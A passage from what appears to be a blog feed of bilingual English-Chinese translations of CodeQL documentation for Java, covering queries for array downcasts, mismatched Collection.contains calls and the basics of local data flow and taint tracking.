type <code>A[]</code> which are then cast to <code>A[]</code>:</p><blockquote><p>使用这些新的类，我们可以扩展我们的查询，以排除对A[]类型参数的toArray的调用，然后将其投向A[]:</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">&#x2F;** class representing java.util.Collection.toArray(T[]) *&#x2F;</span><br><span class="line">class CollectionToArray extends Method &#123;</span><br><span class="line">    CollectionToArray() &#123;</span><br><span class="line">        this.getDeclaringType().hasQualifiedName(&quot;java.util&quot;, &quot;Collection&quot;) and</span><br><span class="line">        this.hasName(&quot;toArray&quot;) and</span><br><span class="line">        this.getNumberOfParameters() &#x3D; 1</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;** class representing calls to java.util.Collection.toArray(T[]) *&#x2F;</span><br><span class="line">class CollectionToArrayCall extends MethodAccess &#123;</span><br><span class="line">    CollectionToArrayCall() &#123;</span><br><span class="line">        exists(CollectionToArray m |</span><br><span class="line">            this.getMethod().getSourceDeclaration().overridesOrInstantiates*(m)</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;** the call&#39;s actual return type, as determined from its argument *&#x2F;</span><br><span class="line">    Array getActualReturnType() &#123;</span><br><span class="line">        result &#x3D; this.getArgument(0).getType()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from CastExpr ce, Array source, Array target</span><br><span class="line">where source &#x3D; ce.getExpr().getType() and</span><br><span class="line">    target &#x3D; ce.getType() and</span><br><span class="line">    target.getElementType().(RefType).getASupertype+() &#x3D; source.getElementType() and</span><br><span class="line">    not ce.getExpr().(CollectionToArrayCall).getActualReturnType() &#x3D; target</span><br><span class="line">select ce, &quot;Potentially problematic array downcast.&quot;</span><br></pre></td></tr></table></figure><p>➤ <a href="https://lgtm.com/query/3150404889854131463/" target="_blank" rel="noopener">See this in the query console on LGTM.com</a>. Notice that fewer results are found by this improved query.</p><blockquote><p>➤ 在LGTM.com的查询控制台中可以看到。请注意，通过这种改进的查询找到的结果较少。</p></blockquote><p><img src="/.io//C:%5CUsers%5CSamny%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210324162027070.png" alt="image-20210324162027070"></p><p><img src="/.io//C:%5CUsers%5CSamny%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210324162036681.png" alt="image-20210324162036681"></p><h2 id="Example-Finding-mismatched-contains-checks"><a href="#Example-Finding-mismatched-contains-checks" class="headerlink" title="Example: Finding mismatched contains checks"></a>Example: Finding mismatched contains checks</h2><p>We’ll now develop a query that finds uses of <code>Collection.contains</code> where the type of the queried element is unrelated to the element type of the collection, which guarantees that the test will always return <code>false</code>.</p><blockquote><p>现在我们将开发一个查询，找到Collection.contains的用法，其中被查询的元素类型与集合的元素类型无关，这就保证了测试将总是返回false。</p></blockquote><p>For example, <a href="https://zookeeper.apache.org/" target="_blank" rel="noopener">Apache Zookeeper</a> used to have a snippet of code similar to the following in class <code>QuorumPeerConfig</code>:</p><blockquote><p>例如，Apache Zookeeper曾经在类QuorumPeerConfig中，有一段类似于下面的代码:</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;Object, Object&gt; zkProp;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; ...</span><br><span class="line"></span><br><span class="line">if (zkProp.entrySet().contains(&quot;dynamicConfigFile&quot;))&#123;</span><br><span class="line">    &#x2F;&#x2F; ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Since <code>zkProp</code> is a map from <code>Object</code> to <code>Object</code>, <code>zkProp.entrySet</code> returns a collection of type <code>Set&lt;Entry&lt;Object, Object&gt;&gt;</code>. Such a set cannot possibly contain an element of type <code>String</code>. (The code has since been fixed to use <code>zkProp.containsKey</code>.)</p><blockquote><p>由于zkProp是一个从Object到Object的映射，所以zkProp.entrySet返回一个类型为Set&lt;Entry&lt;Object，Object&gt;&gt;的集合。这样的集合不可能包含一个String类型的元素。(这段代码后来被修正为使用zkProp.containsKey)。</p></blockquote><p>In general, we want to find calls to <code>Collection.contains</code> (or any of its overriding methods in any parameterized instance of <code>Collection</code>), such that the type <code>E</code> of collection elements and the type <code>A</code> of the argument to <code>contains</code> are unrelated, that is, they have no common subtype.</p><blockquote><p>一般来说，我们希望找到对Collection.contains的调用（或者在Collection的任何参数化实例中找到它的任何覆盖方法），这样集合元素的类型E和contains参数的类型A是不相关的，也就是说，它们没有共同的子类型。</p></blockquote><p>We start by creating a class that describes <code>java.util.Collection</code>:</p><blockquote><p>我们先创建一个描述java.util.Collection的类:</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class JavaUtilCollection extends GenericInterface &#123;</span><br><span class="line">    JavaUtilCollection() &#123;</span><br><span class="line">        this.hasQualifiedName(&quot;java.util&quot;, &quot;Collection&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>To make sure we have not mistyped anything, we can run a simple test query:</p><blockquote><p>为了确保我们没有输入错误，我们可以运行一个简单的测试查询:</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from JavaUtilCollection juc</span><br><span class="line">select juc</span><br></pre></td></tr></table></figure><p>This query should return precisely one result.</p><blockquote><p>这个查询应该正好返回一个结果。</p></blockquote><p>Next, we can create a class that describes <code>java.util.Collection.contains</code>:</p><blockquote><p>接下来，我们可以创建一个描述java.util.Collection.contains的类。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class JavaUtilCollectionContains extends Method &#123;</span><br><span class="line">    JavaUtilCollectionContains() &#123;</span><br><span class="line">        this.getDeclaringType() instanceof JavaUtilCollection and</span><br><span class="line">        this.hasStringSignature(&quot;contains(Object)&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Notice that we use <code>hasStringSignature</code> to check that:</p><blockquote><p>注意，我们使用hasStringSignature来检查:</p></blockquote><ul><li>The method in question has name <code>contains</code>. 这个方法的名字<code>contains</code>..</li><li>It has exactly one argument.它正好有一个参数。</li><li>The type of the argument is <code>Object</code>.参数的类型是Object。</li></ul><p>Alternatively, we could have implemented these three checks more verbosely using <code>hasName</code>, <code>getNumberOfParameters</code>, and <code>getParameter(0).getType() instanceof TypeObject</code>.</p><blockquote><p>另外，我们还可以使用hasName、getNumberOfParameters和getParameter(0).getType()instanceofTypeObject更详细地实现这三个检查。</p></blockquote><p>As before, it is a good idea to test the new class by running a simple query to select all instances of <code>JavaUtilCollectionContains</code>; again there should only be a single result.</p><blockquote><p>和之前一样，通过运行一个简单的查询来选择JavaUtilCollectionContains的所有实例来测试新类是个好主意；同样应该只有一个结果。</p></blockquote><p>Now we want to identify all calls to <code>Collection.contains</code>, including any methods that override it, and considering all parameterized instances of <code>Collection</code> and its subclasses. That is, we are looking for method accesses where the source declaration of the invoked method (reflexively or transitively) overrides <code>Collection.contains</code>. We encode this in a CodeQL class <code>JavaUtilCollectionContainsCall</code>:</p><blockquote><p>现在我们要识别所有对Collection.contains的调用，包括任何覆盖它的方法，并考虑Collection及其子类的所有参数化实例。也就是说，我们要寻找被调用方法的源声明（反射性的或过渡性的）覆盖Collection.contains的方法访问。我们将其编码在一个CodeQL类JavaUtilCollectionContainsCall中:</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class JavaUtilCollectionContainsCall extends MethodAccess &#123;</span><br><span class="line">    JavaUtilCollectionContainsCall() &#123;</span><br><span class="line">        exists(JavaUtilCollectionContains jucc |</span><br><span class="line">            this.getMethod().getSourceDeclaration().overrides*(jucc)</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This definition is slightly subtle, so you should run a short query to test that <code>JavaUtilCollectionContainsCall</code> correctly identifies calls to <code>Collection.contains</code>.</p><blockquote><p>这个定义略显微妙，所以你应该运行一个简短的查询来测试JavaUtilCollectionContainsCall是否能正确识别对Collection.contains的调用。</p></blockquote><p>For every call to <code>contains</code>, we are interested in two things: the type of the argument, and the element type of the collection on which it is invoked. So we need to add two member predicates <code>getArgumentType</code> and <code>getCollectionElementType</code> to class <code>JavaUtilCollectionContainsCall</code> to compute this information.\</p><blockquote><p>对于每一个对contains的调用，我们对两件事感兴趣：参数的类型，以及它被调用的集合的元素类型。所以我们需要在类JavaUtilCollectionContainsCall中添加两个成员谓词getArgumentType和getCollectionElementType来计算这些信息。</p></blockquote><p>The former is easy:</p><blockquote><p>前者很简单:</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Type getArgumentType() &#123;</span><br><span class="line">    result &#x3D; this.getArgument(0).getType()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>For the latter, we proceed as follows:</p><blockquote><p>对于后者，我们的操作如下:</p></blockquote><ul><li>Find the declaring type <code>D</code> of the <code>contains</code> method being invoked. 找到被调用的包含方法的声明类型D.</li><li>Find a (reflexive or transitive) super type <code>S</code> of <code>D</code> that is a parameterized instance of <code>java.util.Collection</code>.找到D的一个（反射型或转义型）超级类型S，它是java.util.Collection的参数化实例。</li><li>Return the (only) type argument of <code>S</code>.返回S的（唯一）类型参数。</li></ul><p>We encode this as follows:</p><blockquote><p>我们将其编码如下:</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Type getCollectionElementType() &#123;</span><br><span class="line">    exists(RefType D, ParameterizedInterface S |</span><br><span class="line">        D &#x3D; this.getMethod().getDeclaringType() and</span><br><span class="line">        D.hasSupertype*(S) and S.getSourceDeclaration() instanceof JavaUtilCollection and</span><br><span class="line">        result &#x3D; S.getTypeArgument(0)</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Having added these two member predicates to <code>JavaUtilCollectionContainsCall</code>, we need to write a predicate that checks whether two given reference types have a common subtype:</p><blockquote><p>在给JavaUtilCollectionContainsCall添加了这两个成员谓词后，我们需要写一个谓词来检查两个给定的引用类型是否有共同的子类型:</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">predicate haveCommonDescendant(RefType tp1, RefType tp2) &#123;</span><br><span class="line">    exists(RefType commondesc | commondesc.hasSupertype*(tp1) and commondesc.hasSupertype*(tp2))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Now we are ready to write a first version of our query:</p><blockquote><p>现在我们准备好写第一个版本的查询:</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">class JavaUtilCollection extends GenericInterface &#123;</span><br><span class="line">    JavaUtilCollection() &#123;</span><br><span class="line">        this.hasQualifiedName(&quot;java.util&quot;, &quot;Collection&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class JavaUtilCollectionContains extends Method &#123;</span><br><span class="line">    JavaUtilCollectionContains() &#123;</span><br><span class="line">        this.getDeclaringType() instanceof JavaUtilCollection and</span><br><span class="line">        this.hasStringSignature(&quot;contains(Object)&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class JavaUtilCollectionContainsCall extends MethodAccess &#123;</span><br><span class="line">    JavaUtilCollectionContainsCall() &#123;</span><br><span class="line">        exists(JavaUtilCollectionContains jucc |</span><br><span class="line">            this.getMethod().getSourceDeclaration().overrides*(jucc)</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">   Type getArgumentType() &#123;</span><br><span class="line">    result &#x3D; this.getArgument(0).getType()</span><br><span class="line">    &#125;</span><br><span class="line">    Type getCollectionElementType() &#123;</span><br><span class="line">    exists(RefType D, ParameterizedInterface S |</span><br><span class="line">        D &#x3D; this.getMethod().getDeclaringType() and</span><br><span class="line">        D.hasSupertype*(S) and S.getSourceDeclaration() instanceof JavaUtilCollection and</span><br><span class="line">        result &#x3D; S.getTypeArgument(0)</span><br><span class="line">    )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">predicate haveCommonDescendant(RefType tp1, RefType tp2) &#123;</span><br><span class="line">    exists(RefType commondesc | commondesc.hasSupertype*(tp1) and commondesc.hasSupertype*(tp2))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from JavaUtilCollectionContainsCall juccc, Type collEltType, Type argType</span><br><span class="line">where collEltType &#x3D; juccc.getCollectionElementType() and argType &#x3D; juccc.getArgumentType() and</span><br><span class="line">    not haveCommonDescendant(collEltType, argType)</span><br><span class="line">select juccc, &quot;Element type &quot; + collEltType + &quot; is incompatible with argument type &quot; + argType</span><br></pre></td></tr></table></figure><p>➤ <a href="https://lgtm.com/query/7947831380785106258/" target="_blank" rel="noopener">See this in the query console on LGTM.com</a>.</p><blockquote><p>➤ 在LGTM.com的查询控制台中查看。</p></blockquote><p><img src="https://gitee.com/samny/images/raw/master/20u21er20ec/20u21er20ec.png" alt="image-20210324162120571"></p><p><img src="https://gitee.com/samny/images/raw/master/38u21er38ec/38u21er38ec.png" alt="image-20210324162138891"></p><p><img src="https://gitee.com/samny/images/raw/master/57u21er57ec/57u21er57ec.png" alt="image-20210324162156970"></p><h3 id="Improvements-1"><a href="#Improvements-1" class="headerlink" title="Improvements"></a>Improvements</h3><p>For many programs, this query yields a large number of false positive results due to type variables and wild cards: if the collection element type is some type variable <code>E</code> and the argument type is <code>String</code>, for example, CodeQL will consider that the two have no common subtype, and our query will flag the call. An easy way to exclude such false positive results is to simply require that neither <code>collEltType</code> nor <code>argType</code> are instances of <code>TypeVariable</code>.</p><blockquote><p>对于很多程序来说，由于类型变量和通配符的原因，这个查询会产生大量的假阳性结果：例如，如果集合元素类型是某个类型变量E，而参数类型是String，CodeQL会认为两者没有共同的子类型，我们的查询就会标记调用。排除这种假阳性结果的一个简单方法是简单地要求 collEltType 和 argType 都不是 TypeVariable 的实例。</p></blockquote><p>Another source of false positives is autoboxing of primitive types: if, for example, the collection’s element type is <code>Integer</code> and the argument is of type <code>int</code>, predicate <code>haveCommonDescendant</code> will fail, since <code>int</code> is not a <code>RefType</code>. To account for this, our query should check that <code>collEltType</code> is not the boxed type of <code>argType</code>.</p><blockquote><p>另一个误报的来源是基元类型的自动装箱：例如，如果集合的元素类型是Integer，而参数的类型是int，那么谓词haveCommonDescendant将失败，因为int不是RefType。为了说明这一点，我们的查询应该检查 collEltType 不是 argType 的框定类型。</p></blockquote><p>Finally, <code>null</code> is special because its type (known as <code>&lt;nulltype&gt;</code> in the CodeQL library) is compatible with every reference type, so we should exclude it from consideration.</p><blockquote><p>最后，null是特殊的，因为它的类型（在CodeQL库中称为<nulltype>）与每个引用类型都是兼容的，所以我们应该把它排除在考虑范围之外。</nulltype></p></blockquote><p>Adding these three improvements, our final query becomes:</p><blockquote><p>加上这三项改进，我们的最终查询就变成了。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">class JavaUtilCollection extends GenericInterface &#123;</span><br><span class="line">    JavaUtilCollection() &#123;</span><br><span class="line">        this.hasQualifiedName(&quot;java.util&quot;, &quot;Collection&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class JavaUtilCollectionContains extends Method &#123;</span><br><span class="line">    JavaUtilCollectionContains() &#123;</span><br><span class="line">        this.getDeclaringType() instanceof JavaUtilCollection and</span><br><span class="line">        this.hasStringSignature(&quot;contains(Object)&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class JavaUtilCollectionContainsCall extends MethodAccess &#123;</span><br><span class="line">    JavaUtilCollectionContainsCall() &#123;</span><br><span class="line">        exists(JavaUtilCollectionContains jucc |</span><br><span class="line">            this.getMethod().getSourceDeclaration().overrides*(jucc)</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">   Type getArgumentType() &#123;</span><br><span class="line">    result &#x3D; this.getArgument(0).getType()</span><br><span class="line">    &#125;</span><br><span class="line">    Type getCollectionElementType() &#123;</span><br><span class="line">    exists(RefType D, ParameterizedInterface S |</span><br><span class="line">        D &#x3D; this.getMethod().getDeclaringType() and</span><br><span class="line">        D.hasSupertype*(S) and S.getSourceDeclaration() instanceof JavaUtilCollection and</span><br><span class="line">        result &#x3D; S.getTypeArgument(0)</span><br><span class="line">    )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">predicate haveCommonDescendant(RefType tp1, RefType tp2) &#123;</span><br><span class="line">    exists(RefType commondesc | commondesc.hasSupertype*(tp1) and commondesc.hasSupertype*(tp2))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from JavaUtilCollectionContainsCall juccc, Type collEltType, Type argType</span><br><span class="line">where collEltType &#x3D; juccc.getCollectionElementType() and argType &#x3D; juccc.getArgumentType() and</span><br><span class="line">    not haveCommonDescendant(collEltType, argType) and</span><br><span class="line">    not collEltType instanceof TypeVariable and not argType instanceof TypeVariable and</span><br><span class="line">    not collEltType &#x3D; argType.(PrimitiveType).getBoxedType() and</span><br><span class="line">    not argType.hasName(&quot;&lt;nulltype&gt;&quot;)</span><br><span class="line">select juccc, &quot;Element type &quot; + collEltType + &quot; is incompatible with argument type &quot; + argType</span><br></pre></td></tr></table></figure><p>➤ <a href="https://lgtm.com/query/8846334903769538099/" target="_blank" rel="noopener">See the full query in the query console on LGTM.com</a>.</p><blockquote><p>➤ 在LGTM.com的查询控制台中查看完整的查询。</p></blockquote><p><img src="https://gitee.com/samny/images/raw/master/41u44er41ec/41u44er41ec.png" alt="image-20210324164441442"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Types-in-Java¶&quot;&gt;&lt;a href=&quot;#Types-in-Java¶&quot; class=&quot;headerlink&quot; title=&quot;Types in Java¶&quot;&gt;&lt;/a&gt;Types in Java&lt;a href=&quot;https://codeql.github.
      
    
    </summary>
    
    
      <category term="codeql" scheme="https://summersec.github.io/categories/codeql/"/>
    
    
  </entry>
  
  <entry>
    <title>Analyzing data flow in Java</title>
    <link href="https://summersec.github.io/2021/03/23/Analyzing%20data%20flow%20in%20Java/"/>
    <id>https://summersec.github.io/2021/03/23/Analyzing%20data%20flow%20in%20Java/</id>
    <published>2021-03-23T11:01:42.000Z</published>
    <updated>2021-03-22T13:44:09.082Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Analyzing-data-flow-in-Java¶"><a href="#Analyzing-data-flow-in-Java¶" class="headerlink" title="Analyzing data flow in Java¶"></a>Analyzing data flow in Java<a href="https://codeql.github.com/docs/codeql-language-guides/analyzing-data-flow-in-java/#analyzing-data-flow-in-java" target="_blank" rel="noopener">¶</a></h1><p>You can use CodeQL to track the flow of data through a Java program to its use.</p><blockquote><p>你可以使用CodeQL来跟踪数据流通过Java程序的使用情况。</p></blockquote><h2 id="About-this-article"><a href="#About-this-article" class="headerlink" title="About this article"></a>About this article</h2><p>This article describes how data flow analysis is implemented in the CodeQL libraries for Java and includes examples to help you write your own data flow queries. The following sections describe how to use the libraries for local data flow, global data flow, and taint tracking.</p><blockquote><p>本文介绍了如何在Java的CodeQL库中实现数据流分析，并包含了一些例子来帮助你编写自己的数据流查询。下面的章节描述了如何使用这些库进行本地数据流、全局数据流和污点跟踪。</p></blockquote><p>For a more general introduction to modeling data flow, see “<a href="https://codeql.github.com/docs/writing-codeql-queries/about-data-flow-analysis/#about-data-flow-analysis" target="_blank" rel="noopener">About data flow analysis</a>.”</p><blockquote><p>有关数据流建模的更一般介绍，请参见 “关于数据流分析”。</p></blockquote><h2 id="Local-data-flow"><a href="#Local-data-flow" class="headerlink" title="Local data flow"></a>Local data flow</h2><p>Local data flow is data flow within a single method or callable. Local data flow is usually easier, faster, and more precise than global data flow, and is sufficient for many queries.</p><blockquote><p>本地数据流是指单个方法或可调用内的数据流。本地数据流通常比全局数据流更简单、更快速、更精确，对于很多查询来说已经足够了。</p></blockquote><h3 id="Using-local-data-flow"><a href="#Using-local-data-flow" class="headerlink" title="Using local data flow"></a>Using local data flow</h3><p>The local data flow library is in the module <code>DataFlow</code>, which defines the class <code>Node</code> denoting any element that data can flow through. <code>Node</code>s are divided into expression nodes (<code>ExprNode</code>) and parameter nodes (<code>ParameterNode</code>). You can map between data flow nodes and expressions/parameters using the member predicates <code>asExpr</code> and <code>asParameter</code>:</p><blockquote><p>本地数据流库在模块DataFlow中，它定义了类Node，表示数据可以流经的任何元素。节点分为表达式节点（ExprNode）和参数节点（ParameterNode）。您可以使用成员谓词asExpr和asParameter在数据流节点和表达式/参数之间进行映射:</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class Node &#123;</span><br><span class="line">  &#x2F;** Gets the expression corresponding to this node, if any. *&#x2F;</span><br><span class="line">  Expr asExpr() &#123; ... &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;** Gets the parameter corresponding to this node, if any. *&#x2F;</span><br><span class="line">  Parameter asParameter() &#123; ... &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>or using the predicates <code>exprNode</code> and <code>parameterNode</code>:</p><blockquote><p>或使用谓词 exprNode 和 parameterNode:</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * Gets the node corresponding to expression &#96;e&#96;.</span><br><span class="line"> *&#x2F;</span><br><span class="line">ExprNode exprNode(Expr e) &#123; ... &#125;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * Gets the node corresponding to the value of parameter &#96;p&#96; at function entry.</span><br><span class="line"> *&#x2F;</span><br><span class="line">ParameterNode parameterNode(Parameter p) &#123; ... &#125;</span><br></pre></td></tr></table></figure><p>The predicate <code>localFlowStep(Node nodeFrom, Node nodeTo)</code> holds if there is an immediate data flow edge from the node <code>nodeFrom</code> to the node <code>nodeTo</code>. You can apply the predicate recursively by using the <code>+</code> and <code>*</code> operators, or by using the predefined recursive predicate <code>localFlow</code>, which is equivalent to <code>localFlowStep*</code>.</p><blockquote><p>如果存在从节点nodeFrom到节点nodeTo的即时数据流边，则谓词localFlowStep(Node nodeFrom, Node nodeTo)成立。您可以通过使用+和<em>运算符，或者通过使用定义的递归谓词localFlow（相当于localFlowStep</em>）来递归应用该谓词。</p></blockquote><p>For example, you can find flow from a parameter <code>source</code> to an expression <code>sink</code> in zero or more local steps:</p><blockquote><p>例如，可以在零个或多个本地步骤中找到从参数源到表达式接收器的污点传 播：DataFlow::localFlow(DataFlow::parameterNode(source), DataFlow::exprNode(sink))</p></blockquote><h3 id="Using-local-taint-tracking"><a href="#Using-local-taint-tracking" class="headerlink" title="Using local taint tracking"></a>Using local taint tracking</h3><p>Local taint tracking extends local data flow by including non-value-preserving flow steps. For example:</p><blockquote><p>本地污点跟踪通过包括非保值流步骤来扩展本地数据流。例如: </p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String temp &#x3D; x;</span><br><span class="line">String y &#x3D; temp + &quot;, &quot; + temp;</span><br></pre></td></tr></table></figure><p>If <code>x</code> is a tainted string then <code>y</code> is also tainted.</p><blockquote><p>如果x是一个污点字符串，那么y也是污点。</p></blockquote><p>The local taint tracking library is in the module <code>TaintTracking</code>. Like local data flow, a predicate <code>localTaintStep(DataFlow::Node nodeFrom, DataFlow::Node nodeTo)</code> holds if there is an immediate taint propagation edge from the node <code>nodeFrom</code> to the node <code>nodeTo</code>. You can apply the predicate recursively by using the <code>+</code> and <code>*</code> operators, or by using the predefined recursive predicate <code>localTaint</code>, which is equivalent to <code>localTaintStep*</code>.</p><blockquote><p>本地污点跟踪库在TaintTracking模块中。和本地数据流一样，如果有一条从节点nodeFrom到节点nodeTo的即时污点传播边，则谓词localTaintStep(DataFlow::Node nodeFrom, DataFlow::Node nodeTo)成立。您可以通过使用+和<em>运算符，或者通过使用定义的递归谓词localTaint（相当于localTaintStep</em>）来递归应用该谓词。</p></blockquote><p>For example, you can find taint propagation from a parameter <code>source</code> to an expression <code>sink</code> in zero or more local steps:</p><blockquote><p>例如，可以在零个或多个本地步骤中找到从参数源到表达式接收器的污点传播：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TaintTracking::localTaint(DataFlow::parameterNode(source), DataFlow::exprNode(sink))</span><br></pre></td></tr></table></figure><h3 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h3><p>This query finds the filename passed to <code>new FileReader(..)</code>.</p><blockquote><p>这个查询可以找到传递给new FileReader(.)的文件名。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from Constructor fileReader, Call call</span><br><span class="line">where</span><br><span class="line">  fileReader.getDeclaringType().hasQualifiedName(&quot;java.io&quot;, &quot;FileReader&quot;) and</span><br><span class="line">  call.getCallee() &#x3D; fileReader</span><br><span class="line">select call.getArgument(0)</span><br></pre></td></tr></table></figure><p><img 